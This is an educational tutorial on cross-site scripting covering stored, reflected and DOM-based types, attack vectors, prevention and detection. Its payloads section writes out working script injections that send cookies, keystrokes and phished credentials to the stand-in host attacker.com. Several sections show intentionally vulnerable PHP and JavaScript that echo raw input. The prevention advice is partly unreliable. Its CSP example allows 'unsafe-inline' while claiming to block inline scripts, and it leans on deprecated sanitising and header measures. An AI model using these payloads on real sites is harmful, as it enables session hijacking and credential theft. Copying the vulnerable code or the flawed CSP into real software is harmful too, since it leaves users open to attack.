# XSS (Cross-Site Scripting) Deep Dive - Complete Understanding

## Table of Contents
1. [What is XSS?](#what-is-xss)
2. [Why XSS Matters](#why-xss-matters)
3. [Types of XSS](#types-of-xss)
4. [XSS Attack Vectors](#xss-attack-vectors)
5. [XSS Payloads](#xss-payloads)
6. [XSS Prevention](#xss-prevention)
7. [XSS Detection](#xss-detection)
8. [Best Practices](#best-practices)

---

## What is XSS?

### Definition

**XSS (Cross-Site Scripting)**: Security vulnerability allowing attackers to inject malicious scripts into web pages.

**Key Characteristics:**
- **Script injection**: Malicious script injection
- **Browser execution**: Executed in browser
- **User impact**: Affects users
- **Common**: Very common vulnerability

### Real-World Analogy

**XSS = Poisoned Food:**
- **Food**: Web page
- **Poison**: Malicious script
- **Consumer**: User
- **Effect**: Harmful effect

**Web Security:**
- **Web page**: Vulnerable page
- **Script**: Malicious script
- **User**: Victim user
- **Attack**: XSS attack

---

## Why XSS Matters?

### Impact

**1. Data Theft:**
```
XSS
  ↓
Cookie theft
  ↓
Session hijacking
```

**2. Account Takeover:**
```
XSS
  ↓
Credential theft
  ↓
Account compromise
```

**3. Malware Distribution:**
```
XSS
  ↓
Malware injection
  ↓
User infection
```

---

## Types of XSS

### Stored XSS (Persistent XSS)

**Stored XSS:**
- **Stored**: Stored in database
- **Persistent**: Persistent attack
- **All users**: Affects all users
- **Severe**: Most severe type

**Attack Flow:**
```
1. Attacker injects script
2. Script stored in database
3. Script served to users
4. Script executes in browser
```

**Example:**
```javascript
// Attacker input
<script>alert('XSS')</script>

// Stored in database
// Served to all users
// Executes in browser
```

### Reflected XSS (Non-Persistent XSS)

**Reflected XSS:**
- **Reflected**: Reflected in response
- **Non-persistent**: Not stored
- **Single user**: Affects single user
- **URL-based**: URL-based attack

**Attack Flow:**
```
1. Attacker crafts URL with script
2. User clicks URL
3. Script reflected in response
4. Script executes in browser
```

**Example:**
```
URL: https://example.com/search?q=<script>alert('XSS')</script>
Response: <p>Search results for: <script>alert('XSS')</script></p>
```

### DOM-Based XSS

**DOM-Based XSS:**
- **Client-side**: Client-side vulnerability
- **DOM manipulation**: DOM manipulation
- **No server**: No server involvement
- **JavaScript**: JavaScript-based

**Attack Flow:**
```
1. Attacker crafts URL
2. JavaScript reads from URL
3. JavaScript writes to DOM
4. Script executes
```

**Example:**
```javascript
// Vulnerable code
document.getElementById('output').innerHTML = location.hash.substring(1);

// Attack URL
https://example.com/#<script>alert('XSS')</script>
```

---

## XSS Attack Vectors

### Vector 1: Input Fields

**Input Fields:**
- **Forms**: Form inputs
- **Search**: Search boxes
- **Comments**: Comment fields
- **User input**: Any user input

**Vulnerable Code:**
```html
<input type="text" name="username" value="<?php echo $_GET['username']; ?>">
```

**Attack:**
```
username=<script>alert('XSS')</script>
```

### Vector 2: URL Parameters

**URL Parameters:**
- **Query strings**: Query parameters
- **Fragments**: URL fragments
- **Reflected**: Reflected in response
- **Common**: Very common

**Vulnerable Code:**
```php
echo "Search results for: " . $_GET['q'];
```

**Attack:**
```
?q=<script>alert('XSS')</script>
```

### Vector 3: HTTP Headers

**HTTP Headers:**
- **User-Agent**: User-Agent header
- **Referer**: Referer header
- **Custom headers**: Custom headers
- **Reflected**: Reflected in response

**Vulnerable Code:**
```php
echo "User-Agent: " . $_SERVER['HTTP_USER_AGENT'];
```

**Attack:**
```
User-Agent: <script>alert('XSS')</script>
```

### Vector 4: Cookies

**Cookies:**
- **Cookie values**: Cookie values
- **Reflected**: Reflected in response
- **Less common**: Less common
- **Still possible**: Still possible

---

## XSS Payloads

### Basic Payload

**Basic Alert:**
```javascript
<script>alert('XSS')</script>
```

**Purpose:**
- **Testing**: Test for XSS
- **Proof**: Proof of concept
- **Simple**: Simple payload

### Cookie Theft

**Cookie Theft:**
```javascript
<script>
document.location='http://attacker.com/steal?cookie='+document.cookie
</script>
```

**Purpose:**
- **Session hijacking**: Steal sessions
- **Authentication**: Steal authentication
- **Account takeover**: Account takeover

### Keylogger

**Keylogger:**
```javascript
<script>
document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/log?key=' + e.key;
}
</script>
```

**Purpose:**
- **Key logging**: Log keystrokes
- **Credential theft**: Steal credentials
- **Data theft**: Steal data

### Phishing

**Phishing:**
```javascript
<script>
document.body.innerHTML = '<form action="http://attacker.com/phish">' +
    '<input name="username" placeholder="Username">' +
    '<input name="password" type="password" placeholder="Password">' +
    '<button>Login</button></form>';
</script>
```

**Purpose:**
- **Phishing**: Phishing attack
- **Credential theft**: Steal credentials
- **Deception**: Deceive users

---

## XSS Prevention

### Input Validation

**Input Validation:**
- **Validate**: Validate all input
- **Whitelist**: Whitelist approach
- **Sanitize**: Sanitize input
- **Reject**: Reject malicious input

**Example:**
```php
// Validate input
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die('Invalid username');
}
```

### Output Encoding

**Output Encoding:**
- **Encode**: Encode output
- **Context-aware**: Context-aware encoding
- **HTML encoding**: HTML entity encoding
- **JavaScript encoding**: JavaScript encoding

**Example:**
```php
// HTML encoding
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// JavaScript encoding
echo json_encode($user_input);
```

### Content Security Policy (CSP)

**CSP:**
- **Policy**: Security policy
- **Script sources**: Control script sources
- **Inline scripts**: Block inline scripts
- **Protection**: XSS protection

**Example:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

### HTTP-Only Cookies

**HTTP-Only Cookies:**
- **HTTP-only**: HTTP-only flag
- **JavaScript**: Not accessible via JavaScript
- **Protection**: Cookie theft protection
- **Session**: Session protection

**Example:**
```php
setcookie('session', $session_id, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

---

## XSS Detection

### Manual Testing

**Manual Testing:**
- **Input testing**: Test inputs
- **Payload testing**: Test payloads
- **Response inspection**: Inspect responses
- **Browser testing**: Test in browser

**Test Payloads:**
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### Automated Scanning

**Automated Scanning:**
- **Scanners**: Security scanners
- **Tools**: XSS testing tools
- **Vulnerability scanners**: Vulnerability scanners
- **SAST/DAST**: Static/dynamic analysis

**Tools:**
- **OWASP ZAP**: OWASP ZAP
- **Burp Suite**: Burp Suite
- **XSStrike**: XSStrike
- **XSSer**: XSSer

### Code Review

**Code Review:**
- **Code analysis**: Code analysis
- **Pattern detection**: Pattern detection
- **Vulnerability detection**: Vulnerability detection
- **Best practices**: Check best practices

---

## Best Practices

### 1. Validate and Sanitize Input

**Why:**
- **Security**: Better security
- **Prevention**: Prevent attacks
- **Data quality**: Better data quality
- **Reliability**: More reliable

**Guidelines:**
- **Validate**: Validate all input
- **Whitelist**: Use whitelist approach
- **Sanitize**: Sanitize input
- **Reject**: Reject malicious input

### 2. Encode Output

**Why:**
- **Security**: Better security
- **Prevention**: Prevent XSS
- **Context**: Context-aware encoding
- **Protection**: XSS protection

**Guidelines:**
- **Encode**: Encode all output
- **Context-aware**: Context-aware encoding
- **HTML**: HTML encoding
- **JavaScript**: JavaScript encoding

### 3. Use Security Headers

**Why:**
- **Protection**: Additional protection
- **Defense**: Defense in depth
- **Standards**: Security standards
- **Compliance**: Meet compliance

**Guidelines:**
- **CSP**: Use Content Security Policy
- **X-XSS-Protection**: Use X-XSS-Protection
- **X-Content-Type-Options**: Use X-Content-Type-Options
- **Headers**: Security headers

### 4. Regular Security Testing

**Why:**
- **Detection**: Detect vulnerabilities
- **Prevention**: Prevent attacks
- **Compliance**: Meet compliance
- **Security**: Better security

**Guidelines:**
- **Testing**: Regular security testing
- **Scanning**: Automated scanning
- **Code review**: Code review
- **Penetration testing**: Penetration testing

---

## Summary

XSS (Cross-Site Scripting) is a security vulnerability allowing script injection. Understanding types of XSS (stored, reflected, DOM-based), XSS attack vectors (input fields, URL parameters, HTTP headers, cookies), XSS payloads (basic, cookie theft, keylogger, phishing), XSS prevention (input validation, output encoding, CSP, HTTP-only cookies), XSS detection (manual testing, automated scanning, code review), and best practices is crucial for web application security.

**Key Takeaways:**
- **XSS**: Security vulnerability allowing script injection (script injection, browser execution, user impact, common)
- **Types of XSS**: Stored XSS (stored persistent all users severe), reflected XSS (reflected non-persistent single user URL-based), DOM-based XSS (client-side DOM manipulation no server JavaScript-based)
- **XSS attack vectors**: Input fields (forms search comments user input), URL parameters (query strings fragments reflected common), HTTP headers (User-Agent Referer custom headers reflected), cookies (cookie values reflected less common still possible)
- **XSS payloads**: Basic payload (alert testing proof simple), cookie theft (session hijacking authentication account takeover), keylogger (key logging credential theft data theft), phishing (phishing attack credential theft deception)
- **XSS prevention**: Input validation (validate whitelist sanitize reject), output encoding (encode context-aware HTML JavaScript), Content Security Policy (policy script sources inline scripts protection), HTTP-only cookies (HTTP-only JavaScript not accessible protection session)
- **XSS detection**: Manual testing (input testing payload testing response inspection browser testing), automated scanning (scanners tools vulnerability scanners SAST/DAST), code review (code analysis pattern detection vulnerability detection best practices)
- **Best practices**: Validate and sanitize input, encode output, use security headers, regular security testing

**XSS Types:**
- **Stored**: Most severe
- **Reflected**: Common
- **DOM-based**: Client-side

**Best Practices:**
- Validate and sanitize input
- Encode output
- Use security headers
- Regular security testing

**Next Steps:**
- Learn XSS
- Implement prevention
- Test for XSS
- Monitor and improve

